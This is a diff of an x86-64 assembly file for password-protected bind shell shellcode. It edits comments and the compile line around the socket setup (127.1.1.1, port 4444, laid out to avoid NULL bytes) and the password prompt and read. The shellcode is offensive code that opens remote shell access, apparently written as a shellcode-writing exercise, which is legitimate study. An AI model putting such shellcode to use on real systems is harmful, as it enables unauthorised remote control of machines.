@@ -4,7 +4,7 @@
 ; =====================================
 ;
 ; Compile: 
-;   nasm -f elf64 BindShell-Execve-Stack.nasm -o BindShell-Execve-Stack.o 
+;   nasm -f elf64 BindShell-Execve-Stack_V2.nasm -o BindShell-Execve-Stack_V2.o 
 
 global _start
 
@@ -31,7 +31,7 @@ _start:
 	push SOCK_STREAM
 	pop rsi
 
-	cdq				; CDQ puts RDX = 0 if RAX >= 0
+	cdq				; RDX <- 0
 
 	syscall
 
@@ -47,10 +47,10 @@ _start:
 	;     bzero(&server.sin_zero, 8)
 
 	push rdx				; RDX Zeroed before
-						; bzero here
+						; Pushing bzero in the stack
 	
 	push dword 0x0101017f			; Addr: 127.1.1.1
-						; Use this to avoid NULLs
+						; Used this address to avoid NULLs
 
 	push word 0x5c11			; Port 4444
 
@@ -87,12 +87,9 @@ loop_1:
 password_check:
 
 write_syscall:
-
-	;mov rax, 1				; Syscall number for write()
-	push 1
+        ; rdi still has right value for socket_id
+	push 1                                    ; Syscall number for write()
 	pop rax
-
-	; rdi still keeps the sicket_id, we write() to the socket
 
 	mov r9, "Passwd: "
 	push r9
@@ -100,20 +97,19 @@ write_syscall:
 	push rsp
 	pop rsi
 
-	push 8					; Length of "Passwd: "
+	push 8					   ; Length of "Passwd: "
 	pop rdx
 
 	syscall
 
 read_syscall:
-
-	xor rax, rax				; Syscall number for read()
-	; rdi keeps the socket_id, we read() from it
-
+        ; rdi still has right value for socket_id
+	; rdx has value of 8
+	
+	xor rax, rax				     ; Syscall number for read()
+	
 	; Where to store the input passwd
-	add rsi, 8				; Replace "Passwd: " with the input in the stack
-
-	;rdx already has value 8 from before
+	add rsi, 8				      ; Replace "Passwd: " with the input in the stack
 
 	syscall
 
